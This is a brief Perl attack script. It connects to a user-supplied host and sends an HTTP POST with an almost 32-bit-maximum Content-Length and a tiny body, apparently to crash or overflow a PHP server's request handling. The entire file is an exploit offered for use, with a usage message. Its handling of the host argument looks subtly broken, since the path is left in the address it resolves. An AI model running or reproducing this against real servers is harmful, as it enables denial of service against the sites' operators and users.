#!/usr/bin/env perl

use strict;
use warnings;
use Socket;

sub attack {
    my $DEFAULT = 2147483638;
    my ($host, $port, $conlen) = (shift || "localhost", shift || 80, shift || $DEFAULT);
    my ($page) = $host =~ m/(\/.*)/;
    my $query = "POST $page HTTP/1.1\r\n"
              . "Host: $host\r\n"
              . "Content-Type: application/x-www-form-urlencoded\r\n"
              . "Content-Length: $conlen\r\n"
              . "\r\n"
              . "php_is_awful=true\r\n"
              . "\r\n";
    socket(my $sock, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
    connect($sock, sockaddr_in($port, inet_aton($host)));
    send($sock, $query, 0);
    my $ans = join("", <$sock>);
    print $ans;
    close($sock);
}

sub main {
    if ($#_ == 0) {
        print "Usage: attack [site]/[page] [port] [attack-buffer length]\n";
    }
    attack(@_);
}

main(@ARGV);
